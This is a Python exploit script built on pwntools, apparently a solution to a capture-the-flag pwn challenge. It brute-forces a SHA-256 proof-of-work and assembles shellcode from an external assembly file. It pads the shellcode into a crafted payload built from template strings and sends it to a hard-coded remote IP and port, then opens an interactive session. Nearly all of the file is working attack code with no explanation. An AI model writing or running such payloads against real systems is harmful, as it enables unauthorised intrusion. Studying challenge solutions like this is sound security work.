from pwn import *
import os, string, hashlib
from multiprocessing import Pool


def solve_hash(k):
    target = hash
    chars = string.ascii_letters + string.digits
    sha256 = hashlib.sha256
    suffix1 = k.encode() + suffix
    for a in chars:
        for b in chars:
            for c in chars:
                for d in chars:
                    if sha256((a + b + c + d).encode() + suffix1).digest() == target:
                        res = (a + b + c + d).encode() + suffix1
                        print('found', res)
                        return res
    return None


if __name__ == '__main__':
    n = 2088
    s = []
    t = n - 1 - 99
    s.append(b'a' * 99)
    cur = 97
    while t:
        cur += 1
        u = min(t, 98)
        s.append(b'a' + bytes([cur]) * u)
        t -= u
    s.append(b'\x0500')

    os.system('python3 asm.py exp.S /tmp/exp1 > /tmp/exp')
    exp = bytes(eval(open('/tmp/exp').read()))
    for x in [b'\0', b'\r', b'\n']:
        assert x not in exp

    exp = b'\x05' + b'0' * 9 + exp + (7915999 + 1 - 7915876 - len(exp)) * b'0' + b'flag'
    payload = b'%d\n' % len(s) + b'\n'.join(s) + b'\n1\n' + exp + b'\n'

    r = remote('120.24.57.117', 47987)
    #r = remote('47.106.193.146', 41890)
    #context.log_level = 'debug'
    if 1:
        r.recvuntil('sha256(?????+"')
        suffix = r.recv(15)
        r.recvuntil('==')
        hash = bytes.fromhex(r.recv(64).decode())
        print(suffix, hash)
        p = Pool(8)
        chars = string.ascii_letters + string.digits
        for x in p.map(solve_hash, chars):
            if x is not None:
                r.sendline(x[:5])
    if 0:
        r.recvuntil('Input number of template strings: ')
        r.sendline('100')
        for i in range(1000):
            time.sleep(1)
            r.recvuntil('Template string')
            r.sendline('1')
            print(i)
    r.send(payload)
    r.interactive()  # be patient
